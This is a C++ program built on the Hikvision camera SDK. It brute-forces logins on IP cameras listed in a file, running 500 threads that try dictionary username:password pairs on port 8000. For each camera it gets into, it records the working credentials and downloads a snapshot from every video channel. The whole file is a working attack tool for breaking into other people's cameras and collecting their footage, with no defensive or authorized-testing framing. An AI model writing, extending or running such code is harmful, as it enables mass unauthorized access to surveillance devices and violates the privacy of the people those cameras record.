#include <memory>
#include <iostream>
#include "../include/HCNetSDK.h"
#include "fstream"
#include <arpa/inet.h>
#include <vector>
#include <sstream>
#include <algorithm>
#include <iterator>
#include <thread>
#include <mutex>
#include <sys/stat.h>

bool validateIpAddress(const std::string &ipAddress);

void bruteforce();

void brute(std::string ip);

static std::mutex take_sync;
static std::vector<std::string> ips;

const int port = 8000;
const int threads_count = 500;

void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEINFO_V30 device);

int main() {
    mkdir("./pictures", 0655);
    if (!NET_DVR_Init()) {
        std::cout << "Error NET_DVR_Init\n";
        return 0;
    }
    NET_DVR_SetConnectTime();
    NET_DVR_SetReconnect();

    std::ifstream filein("ips.txt");
    for (std::string line; std::getline(filein, line);) {
        ips.push_back(line);
    }

    std::vector<std::thread> threads;
    for (int i = 0; i < threads_count; i++)
        threads.push_back(std::thread(bruteforce));

    for (int i = 0; i < threads_count; i++)
        threads[i].join();

    NET_DVR_Cleanup();

    std::cout << "Press enter to continue ...\n";
    std::cin.get();
    return 0;
}

void bruteforce() {
    while (true) {
        std::string ip;
        take_sync.lock();
        if (!ips.empty()) {
            ip = ips.back();
            ips.pop_back();
        } else {
            take_sync.unlock();
            break;
        }
        take_sync.unlock();
        brute(ip);
    }
}

void brute(std::string ip) {
    if (!validateIpAddress(ip)) {
        std::cout << ip << " not ip address" << std::endl;
        return;
    }

    const char *host = ip.c_str();
    std::ifstream filein1("dictionary.txt");
    for (std::string line1; std::getline(filein1, line1);) {
        std::replace(line1.begin(), line1.end(), ':', ' ');
        std::istringstream iss(line1);
        std::vector<std::string> result;
        std::copy(std::istream_iterator<std::string>(iss),
                  std::istream_iterator<std::string>(),
                  std::back_inserter(result));

        const char *login = result[0].c_str();
        const char *password = result[1].c_str();

        NET_DVR_DEVICEINFO_V30 device_info;
        int UserID;
        UserID = NET_DVR_Login_V30((char *) host, (const WORD) port, (char *) login, (char *) password,
                                   &device_info);

        std::cout << "Trying " << login << ":" << password << " for " << ip << std::endl;
        if (UserID != -1) {
            std::cout << "\t\t\t\t\t\t\t\t" << login << ":" << password << "@" << ip << ":" << port
                      << std::endl;
            std::ofstream outfile;
            outfile.open("output.txt", std::ios_base::app);
            outfile << device_info.sSerialNumber << "\t\t" << login << ":" << password << "@" << ip << ":" << port
                    << "\n";
            loadPhotos(ip, UserID, device_info);
            NET_DVR_Logout(UserID);
            return;
        } else {
            std::cout << "Could not sign in." << std::endl;
        }
    }
}

void loadPhotos(const std::string ip, const long user_id, const NET_DVR_DEVICEINFO_V30 device) {
    for (int channel = (int) device.byStartChan;
         channel < (int) device.byChanNum + (int) device.byStartChan; channel++) {
        std::string filename = "./pictures/" + ip + "_" + std::to_string(port) + "_" + std::to_string(channel) + ".jpg";
        NET_DVR_JPEGPARA params = {0};
        params.wPicQuality = 2;
        params.wPicSize = 0;
        if (NET_DVR_CaptureJPEGPicture((LONG) user_id, channel, &params, (char *) filename.c_str())) {
            chmod(filename.c_str(), 0655);
            std::cout << "\t\t\t\t\t\t\t\tGetting a photo (channel " << channel << ") from the camera " << ip << ":" << port << "..."
                      << std::endl;
        }
    }
}

bool validateIpAddress(const std::string &ipAddress) {
    struct sockaddr_in sa;
    int result = inet_pton(AF_INET, ipAddress.c_str(), &(sa.sin_addr));
    return result != 0;
}